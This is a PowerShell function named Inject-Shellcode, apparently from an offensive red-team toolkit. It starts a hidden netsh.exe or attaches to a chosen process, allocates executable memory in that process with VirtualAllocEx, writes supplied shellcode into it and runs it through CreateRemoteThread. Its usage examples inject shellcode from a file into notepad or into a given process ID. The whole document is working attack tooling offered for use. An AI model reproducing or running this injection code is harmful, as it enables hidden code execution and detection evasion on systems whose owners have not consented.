function Inject-Shellcode ([switch]$x86, [switch]$x64, [Parameter(Mandatory=$true)]$Shellcode, $ProcID, $ProcessPath)
{
<#
.SYNOPSIS
Inject-Shellcode

Author: @benpturner
 
.DESCRIPTION
Injects shellcode into x86 or x64 bit processes. Tested on Windowns 7 32 bit, Windows 7 64 bit and Windows 10 64bit.

.EXAMPLE
Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte)

.EXAMPLE
Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcID 5634

.EXAMPLE
Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcessPath C:\Windows\System32\notepad.exe

#>
$dl  = [System.Convert]::FromBase64String($p)
$a = [System.Reflection.Assembly]::Load($dl)
$o = New-Object Inject
$pst = New-Object System.Diagnostics.ProcessStartInfo
$pst.UseShellExecute = $False
$pst.CreateNoWindow = $True
$pst.FileName = "C:\Windows\system32\netsh.exe"

if ($x86.IsPresent) {
    if ($env:PROCESSOR_ARCHITECTURE -eq "x86"){
        $pst.FileName = "C:\Windows\System32\netsh.exe"
    } else {
        $pst.FileName = "C:\Windows\Syswow64\netsh.exe"
    }
}
   
if ($ProcessPath) {
    $pst.FileName = "$ProcessPath"
} 
if ($ProcID){
    $Process = [System.Diagnostics.Process]::GetProcessById($ProcID)
} else {
    $Process = [System.Diagnostics.Process]::Start($pst)
}
[IntPtr]$phandle = $Process.Handle
[IntPtr]$zz = 0x10000
[IntPtr]$x = 0
[IntPtr]$nul = 0
[IntPtr]$max = 0x70000000
while( $zz.ToInt32() -lt $max.ToInt32() )
{
    $x=[Inject]::VirtualAllocEx($phandle,$zz,$Shellcode.Length*2,0x3000,0x40)
    if( $x.ToInt32() -ne $nul.ToInt32() ){ break }
    $zz = [Int32]$zz + $Shellcode.Length
}
if( $x.ToInt32() -gt $nul.ToInt32() )
{
    $hg = [Runtime.InteropServices.Marshal]::AllocHGlobal($Shellcode.Length)
    [Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $hg, $Shellcode.Length)|Out-Null
    [Inject]::WriteProcessMemory($phandle,[IntPtr]($x.ToInt32()),$hg, $Shellcode.Length,0)|Out-Null
    [Inject]::CreateRemoteThread($phandle,0,0,[IntPtr]$x,0,0,0)|Out-Null
}

}
